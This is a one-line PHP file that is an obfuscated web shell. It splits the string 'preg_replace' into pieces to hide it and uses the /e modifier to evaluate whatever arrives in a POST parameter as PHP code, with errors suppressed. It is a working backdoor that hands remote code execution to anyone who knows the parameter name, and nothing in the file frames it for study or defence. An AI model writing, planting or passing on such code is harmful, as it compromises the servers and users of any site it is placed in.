<?php $main_page = "pr"."eg_"."rep"."l"."ace"; @$main_page("/[mainpage]/e",$_POST['363698'],"message");?> 
